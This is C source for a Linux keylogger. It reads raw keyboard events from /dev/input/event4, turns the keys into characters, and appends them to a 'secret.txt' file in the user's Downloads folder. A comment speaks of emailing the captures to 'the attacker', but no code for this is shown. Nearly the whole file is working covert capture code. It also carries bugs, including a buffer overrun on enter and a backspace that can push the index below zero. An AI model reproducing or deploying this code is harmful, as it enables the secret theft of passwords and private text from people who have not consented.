#include <stdio.h>
#include <string.h>
#include <linux/input.h> // linux input subsystem user space
#include <fcntl.h> // contains the open() system call to read event4 
#include <unistd.h> // read() and close()
#include <linux/input-event-codes.h> // contains all the correct value : key mappings
#include <sys/utsname.h> // to get the hostname of the system,

/*
 * Keylogger by using the linux.h library
 * Using the input_event struct to identify the key_pressed
 * The keypressed will then be mapped to the correct letter/number
 * This will then be written to some target file
 *
 **/

void get_user(char* user, size_t size) {
    struct utsname uts; 
    if (uname(&uts) != 0)
        perror("Could not retrive hostname!");
    snprintf(user, size, "%s", uts.nodename);
}

int main(int argc, char** argv) {
    /*
     * --------- Using Struct Input_Event ---------
     * - timeval time -- the time at which the event occurs
     * - type -- the type of event; in our case, `EV_KEY` for free press
     * - code -- event code (KEY_A)
     * - value -- value of the event
     *
     **/

    /*
     * struct input_event {
     struct timeval time;  // Timestamp
     __u16 type;           // Event type (e.g., EV_KEY, EV_ABS)
     __u16 code;           // Event code (specific key or axis)
     __s32 value;          // Event value (pressed/released or position)
     };
     *
     **/

    printf("Initializing Keylogger...\n");

    struct input_event InputEvent;

    /**** /dev/input/event4  -- global keyboard keylogger ****/

    int fd = open("/dev/input/event4", O_RDONLY);

    if (fd < 0) {
        perror("Error opening the file!");
        return 1;
    }

    printf("Reading event file...\n"); 

    /*
     * Read the event fd
     * determine the key pressed
     * have a file open in the system to write to
     * whatever key was pressed, write the value to the file
     * after every 10 seconds, an email is sent to the attacker
     *
     **/

    // getitng the user
    char user[128];
    get_user(user, sizeof(user));
    char path[128] = "/home/";
    strcat(path, user);
    strcat(path, "/Downloads/secret.txt");

    // file to write to
    int fd_secret = open(path, O_WRONLY | O_CREAT | O_APPEND, S_IRWXU);

    if (fd_secret < 0) {
        perror("Secret file not created!\n");
    }

    printf("Creating secret file...\n");
    // while loop termination
    int endLoop = 0;

    char buf[16];
    int i = 0;

    printf("Keylogger running!\n");
    // read the keyboard event file for keypresses
    while(!endLoop) {

        if (i >= 14) {
            write(fd_secret, buf, sizeof(buf));
            i = 0;
        }

        read(fd, &InputEvent, sizeof(InputEvent));

        //printf("Type: %d\t Code: %d\t Value: %d\t\n", InputEvent.type,
        //        InputEvent.code, InputEvent.value);

        if (InputEvent.type == EV_KEY && InputEvent.value == 1) {
            // switch case
            switch(InputEvent.code) {
                case KEY_A: buf[i++] = 'a'; break;
                case KEY_B: buf[i++] = 'b'; break;
                case KEY_C: buf[i++] = 'c'; break;
                case KEY_D: buf[i++] = 'd'; break;
                case KEY_E: buf[i++] = 'e'; break;
                case KEY_F: buf[i++] = 'f'; break;
                case KEY_G: buf[i++] = 'g'; break;
                case KEY_H: buf[i++] = 'h'; break;
                case KEY_I: buf[i++] = 'i'; break;
                case KEY_J: buf[i++] = 'j'; break;
                case KEY_K: buf[i++] = 'k'; break;
                case KEY_L: buf[i++] = 'l'; break;
                case KEY_M: buf[i++] = 'm'; break;
                case KEY_N: buf[i++] = 'n'; break;
                case KEY_O: buf[i++] = 'o'; break;
                case KEY_P: buf[i++] = 'p'; break;
                case KEY_Q: buf[i++] = 'q'; break;
                case KEY_R: buf[i++] = 'r'; break;
                case KEY_S: buf[i++] = 's'; break;
                case KEY_T: buf[i++] = 't'; break;
                case KEY_U: buf[i++] = 'u'; break;
                case KEY_V: buf[i++] = 'v'; break;
                case KEY_W: buf[i++] = 'w'; break;
                case KEY_X: buf[i++] = 'x'; break;
                case KEY_Y: buf[i++] = 'y'; break;
                case KEY_Z: buf[i++] = 'z'; break;

                case KEY_SPACE: buf[i++] = ' '; break;
                case KEY_ENTER: buf[i++] = '\r'; buf[i++] = '\n'; break;
                case KEY_BACKSPACE: i--; break;

                case KEY_0: buf[i++]='0'; break;
                case KEY_1: buf[i++]='1'; break;
                case KEY_2: buf[i++]='2'; break;
                case KEY_3: buf[i++]='3'; break;
                case KEY_4: buf[i++]='4'; break;
                case KEY_5: buf[i++]='5'; break;
                case KEY_6: buf[i++]='6'; break;
                case KEY_7: buf[i++]='7'; break;
                case KEY_8: buf[i++]='8'; break;
                case KEY_9: buf[i++]='9'; break;

                default:
                            memset(buf+i, 0, 16-i);
                            write(fd_secret, buf, sizeof(buf));
                            endLoop = 1;
                            break;
            }
        }
    }

    printf("\nclosing the keylogger...\n");
    close(fd_secret);

    close(fd);

    return 0;
}
